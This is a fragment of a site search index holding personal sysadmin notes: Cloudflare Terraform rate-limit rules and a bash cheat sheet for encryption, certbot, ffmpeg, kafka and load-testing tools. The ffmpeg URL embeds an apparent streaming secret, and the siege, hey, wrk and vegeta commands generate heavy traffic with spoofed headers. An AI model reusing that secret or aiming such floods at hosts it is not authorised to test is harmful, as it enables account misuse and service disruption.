style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e  #       }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e  #       cache_ttl_by_status {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e  #           codes = \u0026#34;405-499\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e  #           ttl = -1\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e  #       }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e  #       cache_ttl_by_status {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e  #           codes = \u0026#34;500-599\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e  #           ttl = 0\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e  #       }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e  # }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e}\u003cspan style=\"color:#75715e\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# resource \u0026#34;cloudflare_page_rule\u0026#34; \u0026#34;rules\u0026#34; {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#   count = \u0026#34;${length(keys(\u0026#34;${var.targets}\u0026#34;))}\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#   lifecycle {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#     create_before_destroy = true\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#   }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#   zone_id = \u0026#34;92c6d5010fbacab27d464f4d79c11fce\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#   target = \u0026#34;${var.targets[element(keys(var.targets),count.index)]}\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#   actions {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#     always_use_https = \u0026#34;true\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#     cache_level = \u0026#34;cache_everything\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#   }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#   priority = \u0026#34;${count.index + 1}\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eTerraform_create_rate_limit_rule\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-hcl\" data-lang=\"hcl\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Create rate limit rule\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eresource\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;cloudflare_rate_limit\u0026#34; \u0026#34;wss_rate_limit\u0026#34;\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  zone_id \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;92c6d5010fbacab27d464f4d79c11fce\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  threshold \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e50\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  period \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e60\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003ematch\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003erequest\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      url_pattern \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;*wss*/*\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eaction\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    mode \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;ban\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    timeout \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e3600\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003ecorrelate\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    by \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;nat\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eresource\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;cloudflare_rate_limit\u0026#34; \u0026#34;frontend_rate_limit\u0026#34;\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  zone_id \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;92c6d5010fbacab27d464f4d79c11fce\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  threshold \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e50\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  period \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e10\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003ematch\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003erequest\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      url_pattern \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;*h5*/*\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eaction\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    mode \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;ban\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    timeout \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e3600\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003ecorrelate\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    by \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;nat\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eAPI Document\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://developers.cloudflare.com/api/operations/custom-hostname-for-a-zone-create-custom-hostname\" target=\"_blank\" rel=\"noopener\"\u003eCloudflare for SaaS\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://developers.cloudflare.com/api/operations/dns-records-for-a-zone-create-dns-record\" target=\"_blank\" rel=\"noopener\"\u003epartial (CNAME) zone\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"Cloudflare docs"},{"categories":null,"contents":" ab ab -n 20 -c 20 -k https://default.hddv1.com/error age # generate public and private keys age-keygen -o key.txt # encrypt file with public key age -r public_key -o file.txt.enc file.txt # encrypt file with ssh key age -R ~/.ssh/id_ed25519.pub file.txt \u0026gt; file.txt.enc # decrypt file age --decrypt -i key.txt file.txt.enc \u0026gt; file.txt awk # To lowercase uuidgen|awk \u0026#39;{print tolower($0)}\u0026#39; # output: 649612b0-0fa4-4b50-9b13-17279f602a43 # To uppercase echo \u0026#39;hello world\u0026#39;|awk \u0026#39;{print toupper($0)}\u0026#39; # output: HELLO WORLD # 提取子字符串: `substr(string, start, length)` echo \u0026#34;hello world\u0026#34; | awk \u0026#39;{print substr($0, 1, 5)}\u0026#39; # output: hello # 全局替換字符串中的正則表達式匹配項: `gsub(regex, replacement, string)` # 替換字符串中首次匹配的正則表達式: `sub(regex, replacement, string)` echo \u0026#34;hello world\u0026#34; | awk \u0026#39;{gsub(/world/, \u0026#34;everyone\u0026#34;); print $0}\u0026#39; # output: hello everyone # 將數字轉換為整數 echo \u0026#34;3.14\u0026#34; | awk \u0026#39;{print int($0)}\u0026#39; # output: 3 # 返回平方根 echo \u0026#34;99\u0026#34; | awk \u0026#39;{print sqrt($0)}\u0026#39; # output: 9.94987 # 指數和對數 echo \u0026#34;2\u0026#34; | awk \u0026#39;{print exp($0), log($0)}\u0026#39; # output: 7.38906 0.693147 caffeinate # 防止显示器关闭 caffeinate -d # 保持系统不休眠 caffeinate -i # 保持 30 分钟 caffeinate -t 1800 certbot # Install sudo apt install certbot python3-certbot-nginx python3-certbot-dns-route53 # 1. Generating Wildcard Certificates sudo certbot certonly --manual --preferred-challenges=dns --server https://acme-v02.api.letsencrypt.org/directory --agree-tos -d *.example.com ### add txt record then press enter to continue # 2. Generating Wildcard Certificates sudo certbot certonly -d example.com -d *.example.com --dns-route53 --agree-tos --server https://acme-v02.api.letsencrypt.org/directory # Automating Renewal 0 0 * * 1 /usr/bin/certbot certonly --dns-route53 -d *.example.com --quiet --post-hook \u0026#34;systemctl reload nginx\u0026#34; cutycapt # Capture website page as picture xvfb-run --server-args=\u0026#34;-screen 0, 1024x768x24\u0026#34; cutycapt --url=https://www.google.com --out=\u0026#34;/tmp/google.png\u0026#34; dmesg sudo dmesg -T | grep -i \u0026#39;killed process\u0026#39; # total-vm: 該程序分配的虛擬記憶體總量（含未實際使用） # anon-rss: 匿名頁面 resident memory（實際佔用記憶體）→ 重點 # file-rss: 映射檔案的 resident memory（如 shared libraries） # shmem-rss: 共用記憶體的 resident memory dnscontrol creds.json command dnscontrol get-zones --format=js --out=example.com.js r53 ROUTE53 example.com dnscontrol get-zones --format=js --out=example.com.js cloudflare CLOUDFLAREAPI example.com ffmpeg # Download sample video wget https://www.sample-videos.com/video321/mp4/720/big_buck_bunny_720p_1mb.mp4 -O test.mp4 # Push stream ffmpeg -re -i test.mp4 -c copy -f flv \u0026#34;rtmp://209357.push.tlivecloud.com/live/big_buck_bunny_720p_1mb?txSecret=a543b79d9a8c38ace5ce18eea2bd7721\u0026amp;txTime=687E4609\u0026#34; go go tool pprof -http=:8081 20250814_024534.heap k6 k6.js command k6 run k6.js kafka # list topics kafka-topics.sh --bootstrap-server 127.0.0.1:9094 --list # all topics count kafka-topics.sh --bootstrap-server 127.0.0.1:9094 --list |wc -l hey hey -n 200000 -c 500 -h2 -z 30s https://a8-wss.hddv1.com/test openfortivpn # https://github.com/adrienverge/openfortivpn sudo openfortivpn ip:port --username=ricky --pppd-use-peerdns=1 openssl # 自簽名證書，要把 ca.p7b 匯入 certmgr.msc 的受信任的根憑證授權單位，Chrome 才吃的到。 openssl crl2pkcs7 -nocrl -certfile ca.crt -out ca.p7b prlimit # 更改 Max_open_files 遇到參數錯誤，原因為 CentOS6 與 CentOS7 指令不同 # CentOS6 for i in $(ps -ef | grep \u0026#39;publish/server/game_server\u0026#39; | egrep -v \u0026#39;grep|startall\u0026#39; | awk \u0026#39;{print $2}\u0026#39;); do echo -n \u0026#34;Max open files=1024000:1024000\u0026#34; \u0026gt; /proc/$i/limits; done # CentOS7 for i in $(ps -ef | grep gateway | grep -v grep | awk \u0026#39;{print $2}\u0026#39;); do prlimit --pid $i --nofile=1024000:1024000 ; done siege siege --time=3s --concurrent=30000 https://a8-h5.hddv1.com/index.html tr # cat krypton2 YRIRY GJB CNFFJBEQ EBGGRA # cat krypton2 | tr a-zA-Z n-za-mN-ZA-M LEVEL TWO PASSWORD ROTTEN vegeta #!/usr/bin/env bash attack() { echo \u0026#34;GET ${1}\u0026#34; | vegeta attack -duration=100s -header=\u0026#34;User-Agent: baidu\u0026#34; -header=\u0026#34;X-Forwarded-For: 47.0.0.1\u0026#34; -rate=500 -timeout=1s | vegeta encode | jaggr @count=rps \\ hist\\[100,200,300,400,500\\]:code \\ p25,p50,p95:latency \\ sum:bytes_in \\ sum:bytes_out | jplot rps+code.hist.100+code.hist.200+code.hist.300+code.hist.400+code.hist.500 \\ latency.p95+latency.p50+latency.p25 \\ bytes_in.sum+bytes_out.sum } if [[ -n ${1} ]]; then attack ${1} fi ## -header=\u0026#34;Connection: Upgrade\u0026#34; -header=\u0026#34;Upgrade: websocket\u0026#34; wrk wrk -t10 -c1000 -d30s -H \u0026#34;User-Agent: baidu\u0026#34; \u0026#34;https://default.hddv1.com/error\u0026#34; Vagrant with hyper-v provider Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V -All Common # Find out processes swap usage command for file in /proc/*/status ; do awk \u0026#39;/VmSwap|Name/{printf $2 \u0026#34; \u0026#34; $3}END{ print \u0026#34;\u0026#34;}\u0026#39; $file; done | sort -k 2 -n -r | less Gitbook Hide gitbook sidebar default.\nraw_path=$(pwd) npm install -g gitbook-cli gitbook install cd ~/.gitbook/versions/3.2.3/node_modules/gitbook-plugin-theme-default sed -i \u0026#34;25i\\ \\ \\ \\ gitbook.storage.set(\u0026#39;sidebar\u0026#39;, false);\u0026#34; src/js/theme/sidebar.js npm install -g browserify uglify-js less less-plugin-clean-css npm install src/build.sh Install - autocorrect A linter and formatter for help you improve copywriting, to correct spaces, words, punctuations between CJK (Chinese, Japanese, Korean). Github\nwget https://github.com/huacnlee/autocorrect/releases/download/v1.7.4/autocorrect-darwin-amd64.tar.gz - bpf BCC - Tools for BPF-based Linux IO analysis, networking, monitoring, and more Kernel should higher than 4.1 Install from source is better\n# `/usr/share/bcc/` # https://github.com/iovisor/bcc # https://github.com/iovisor/bcc/blob/master/docs/reference_guide.md#1-kernel-source-directory # https://github.com/iovisor/bpftrace yum install bcc-tools - flamegraph Stack trace visualizer\n# https://github.com/brendangregg/FlameGraph brew install flamegraph - git-split-diffs GitHub style split diffs in your terminal\nnpm install -g git-split-diffs - glci Test your Gitlab CI Pipelines changes locally using Docker. blog\nyarn global add glci - openresty wget https://openresty.org/package/centos/openresty.repo -O /etc/yum.repos.d/openresty.repo yum install -y openresty openresty-resty - perf Performance monitoring for the Linux kernel\n# https://github.com/brendangregg/Misc/blob/master/perf_events/perf.md # http://www.brendangregg.com/perf.html yum install perf - pptx2md A pptx to markdown converter\npip3 install pptx2md - sockperf Network Benchmarking Utility\n# https://github.com/Mellanox/sockperf yum install sockperf - upx UPX - the Ultimate Packer for eXecutables\nbrew install upx - wrk Modern HTTP benchmarking tool\nbrew install wrk LVM # 確認 resize 在哪個 disk lsblk # 確認 `/dev/sde` 是否為該新增 disk 路徑 pvresize /dev/sde # vgdisplay [vg 編號] # 查 free PE / Size 的編號 vgdisplay vg3 # 要升級的 lvm 硬碟路徑 lvdisplay # lvresize -l +[free 的編號] 升級的 lvm 硬碟路徑 lvresize -l +38400 /dev/vg3/disklvm4 # resize xfs_growfs /dev/vg3/disklvm4 # 檢查擴充是否成功 df -h Migration zabbix mysqldump -uroot --opt zabbix \u0026gt; zabbix.sql rsync -az zabbix.sql newserver:/root mysql -uroot zabbix \u0026lt; zabbix.sql Re-create /dev/null rm -f /dev/null mknod /dev/null c 1 3 Script Script Optimization Advanced Shell Scripting Techniques: Automating Complex Tasks with Bash\nUse Built-in Commands: Built-in commands execute faster because they don\u0026rsquo;t require loading an external process. Minimize Subshells: Subshells can be expensive in terms of performance. # Inefficient output=$(cat file.txt) # Efficient output=$(\u0026lt;file.txt) Use Arrays for Bulk Data: When handling a large amount of data, arrays can be more efficient and easier to manage than multiple variables. # Inefficient item1=\u0026#34;apple\u0026#34; item2=\u0026#34;banana\u0026#34; item3=\u0026#34;cherry\u0026#34; # Efficient items=(\u0026#34;apple\u0026#34; \u0026#34;banana\u0026#34; \u0026#34;cherry\u0026#34;) for item in \u0026#34;${items[@]}\u0026#34;; do echo \u0026#34;$item\u0026#34; done Enable Noclobber: To prevent accidental overwriting of files. set -o noclobber Use Functions: Functions allow you to encapsulate and reuse code, making scripts cleaner and reducing redundancy. Efficient File Operations: When performing file operations, use efficient techniques to minimize resource usage. # Inefficient while read -r line; do echo \u0026#34;$line\u0026#34; done \u0026lt; file.txt # Efficient while IFS= read -r line; do echo \u0026#34;$line\u0026#34; done \u0026lt; file.txt Parallel Processing: Tools like xargs and GNU parallel can be incredibly useful. Error Handling: Robust error handling is critical for creating reliable and maintainable scripts. # Exit on Error: Using set -e ensures that your script exits immediately if any command fails, preventing cascading errors. set -e # Custom Error Messages: Implement custom error messages to provide more context when something goes wrong. command1 || { echo \u0026#34;command1 failed\u0026#34;; exit 1; } # Trap Signals: Use the `trap` command to catch and handle signals and errors gracefully. trap \u0026#39;echo \u0026#34;Error occurred\u0026#34;; cleanup; exit 1\u0026#39; ERR function cleanup() { # Cleanup code } # Validate Inputs: Always validate user inputs and script arguments to prevent unexpected behavior. if [[ -z \u0026#34;$1\u0026#34; ]]; then echo \u0026#34;Usage: $0 \u0026lt;argument\u0026gt;\u0026#34; exit 1 fi # Logging: Implement logging to keep track of script execution and diagnose issues. logfile=\u0026#34;script.log\u0026#34; exec \u0026gt; \u0026gt;(tee -i $logfile) exec 2\u0026gt;\u0026amp;1 echo \u0026#34;Script started\u0026#34; Automating Complex System Administration Tasks: Automated Backups System Monitoring User Management Automated Updates Network Configuration macOS install specific version Safari softwareupdate -l sudo softwareupdate -i \u0026#39;Safari18.6VenturaAuto-18.6\u0026#39; ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/notes/bash/common/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eab\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eab -n \u003cspan style=\"color:#ae81ff\"\u003e20\u003c/span\u003e -c \u003cspan style=\"color:#ae81ff\"\u003e20\u003c/span\u003e -k https://default.hddv1.com/error\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eage\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# generate public and private keys\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eage-keygen -o key.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# encrypt file with public key\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eage -r public_key -o file.txt.enc file.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# encrypt file with ssh key\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eage -R ~/.ssh/id_ed25519.pub file.txt \u0026gt; file.txt.enc\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# decrypt file\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eage --decrypt -i key.txt file.txt.enc \u0026gt; file.txt\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eawk\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# To lowercase\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003euuidgen|awk \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;{print tolower($0)}\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e# output: 649612b0-0fa4-4b50-9b13-17279f602a43\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# To uppercase\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;hello world\u0026#39;\u003c/span\u003e|awk \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;{print toupper($0)}\u0026#39;\u003c/span\u003e \u003cspan 